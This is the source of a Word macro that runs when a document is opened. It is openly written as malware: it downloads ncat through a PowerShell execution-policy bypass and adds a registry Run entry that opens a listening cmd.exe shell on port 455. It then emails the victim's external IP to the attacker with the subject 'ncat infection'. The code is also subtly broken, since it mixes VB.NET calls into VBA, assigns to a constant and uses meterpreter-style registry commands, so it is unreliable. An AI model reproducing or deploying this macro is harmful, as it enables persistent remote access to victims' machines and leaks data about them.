Sub Document_Open()
    '
    ' Document_Open Macro
    '
    '

    Const f = "C:\Users\All Users\Documents\f.bat"

    Dim FileNumber As Integer
    Dim retValue As Variant

    f = FreeFile

    'Create batch file
    Open f For Output As #FileNumber
        Print #FileNumber, "powershell –ExecutionPolicy Bypass -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/bdunlap9/NetCat-Portable/raw/master/ncat.exe', 'C:\Users\All Users\Documents\ncat.exe')""
    Close #FileNumber
    
    ' Get External IP
     Dim ExternalIP As String
        ExternalIP = (New WebClient()).DownloadString("http://checkip.dyndns.org/")
        ExternalIP = (New Regex("\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}")) _
                     .Matches(ExternalIP)(0).ToString()
    
    ' Execute Program
    Process.Start ("C:\Windows\System32\cmd.exe", "reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'c:\\All Users\\Documents\\ncat.exe -Ldp 455 -e cmd.exe'")
    Process.Start ("C:\Windows\System32\cmd.exe", "reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc")
    
    'Configure mail
    Set CDO_Mail = CreateObject("CDO.Message")
    On Error GoTo Error_Handling

    Set CDO_Config = CreateObject("CDO.Configuration")
    CDO_Config.Load -1

    Set SMTP_Config = CDO_Config.Fields

    With SMTP_Config
     .Item("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2
     .Item("http://schemas.microsoft.com/cdo/configuration/smtpserver") = "smtp.gmail.com"
     .Item("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate") = 1
     .Item("http://schemas.microsoft.com/cdo/configuration/sendusername") = "<your email>@gmail.com"
     .Item("http://schemas.microsoft.com/cdo/configuration/sendpassword") = "<your password>"
     .Item("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = 25
     .Item("http://schemas.microsoft.com/cdo/configuration/smtpusessl") = True
     .Update
    End With

    With CDO_Mail
        Set .Configuration = CDO_Config
    End With

    Dim CDO_Mail As Object
    Dim CDO_Config As Object
    Dim SMTP_Config As Variant
    Dim strSubject As String
    Dim strFrom As String
    Dim strTo As String
    Dim strCc As String
    Dim strBcc As String
    Dim strBody As String

    strSubject = "ncat infection"
    strFrom = "<your email>@gmail.com"
    strTo = "<your email>@gmail.com"
    strCc = ""
    strBcc = ""
    strBody = ExternalIP
    
    ' Send mail
    CDO_Mail.Subject = strSubject
    CDO_Mail.From = strFrom
    CDO_Mail.To = strTo
    CDO_Mail.TextBody = strBody
    CDO_Mail.CC = strCc
    CDO_Mail.BCC = strBcc
    CDO_Mail.Send

Error_Handling:
    If Err.Description <> "" Then MsgBox Err.Description
    
End Sub
